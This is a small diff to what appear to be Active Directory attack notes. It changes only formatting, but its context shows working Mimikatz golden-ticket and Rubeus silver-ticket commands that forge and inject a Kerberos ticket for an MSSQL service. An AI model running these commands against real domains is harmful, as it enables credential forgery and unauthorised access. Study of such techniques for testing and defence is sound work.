@@ -405,7 +405,7 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
 - Convert that password in RC4 format using hashcat.
 - Get the SID of the domain.
 - Attackkkkkk
-- We can also use rubeus for this attack.
+- We can also use **rubeus** for this attack.
   - `rubeus.exe silver /service:MSSQLSvc/kerbdc1.kerb.local:1433 /rc4:<RC4 hash> /sid:<SID of Domain> /user:Administrator /domain:kerb.local /ptt`
   - Ticket will be successfully imported.
   - `klist`
